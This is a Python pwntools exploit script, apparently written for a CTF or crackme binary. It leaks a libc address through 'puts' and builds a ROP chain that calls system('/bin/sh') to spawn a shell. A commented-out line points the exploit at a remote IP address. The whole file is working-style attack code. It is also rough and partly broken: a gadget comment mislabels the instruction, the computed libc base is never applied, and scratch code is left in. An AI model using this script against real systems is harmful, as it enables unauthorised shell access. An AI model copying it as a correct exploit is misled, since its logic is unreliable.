#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.arch = "amd64"
context.bits = 64
exe = './target'
lib64Path = '/lib64/ld-linux-x86-64.so.2'
libcPath = '/lib/x86_64-linux-gnu/libc.so.6'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode parent
b read
start
'''.format(**locals())

libc = ELF(libcPath)
lib64 = ELF(lib64Path)
target = ELF(exe)

def exploit(base):
    #libc.address = base
    rop = ROP(libc)
    rop.system(next(libc.search('/bin/sh\x00')))
    print rop.dump()
    return rop.chain()

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

# ropper --file ./crackme0x00 --search "pop %;"
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
#io = remote("54.161.125.246", 1010)
io = start()
shellcode = shellcraft.sh()
encodedVal = io.recvline()
leak = int(encodedVal[6:len(encodedVal)], 16)
base = leak - libc.symbols['puts']

popRdi = 0x00000000000008f3 #: pop ebp; ret;

elf = ELF(exe)
def dummy():
    rop = ROP(elf, base=base)
    rop.raw(popRdi)
    rop.raw(elf.got['puts'])
    rop.raw(elf.plt['puts'])
    print rop.dump()
    return rop.chain()

addr = leak - elf.plt['_exit']
print hex(addr)
'''
writethis = leak + 0x77fcb0
print hex(writethis)
writethis = base + 0x670
print hex(writethis)
print hex(elf.plt['_exit'])
'''

log.success('base: ' + hex(base))
payload = exploit(base)
#payload = p64(0xdeadbeef)
#payload = dummy()
writeToFile(payload)
log.info('Payload: ' + payload)
io.send("A"*8)
log.info('Payload: ' + payload)
io.send(payload)
#print io.recv()
#io.interactive()

